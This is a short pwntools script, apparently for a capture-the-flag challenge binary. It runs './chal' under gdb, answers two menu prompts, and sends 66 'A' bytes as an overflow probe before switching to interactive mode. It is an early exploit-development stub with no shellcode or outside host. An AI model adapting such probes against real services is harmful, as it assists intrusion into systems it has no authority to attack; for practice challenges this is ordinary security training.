from pwn import *

context.terminal = ["kitty"]
p = gdb.debug("./chal", gdbscript="c")

p.sendlineafter(b"build: ", b"0")
p.sendlineafter(b": ", b"5")
p.sendlineafter(b": ", b" " + b"A" * 66)

p.interactive()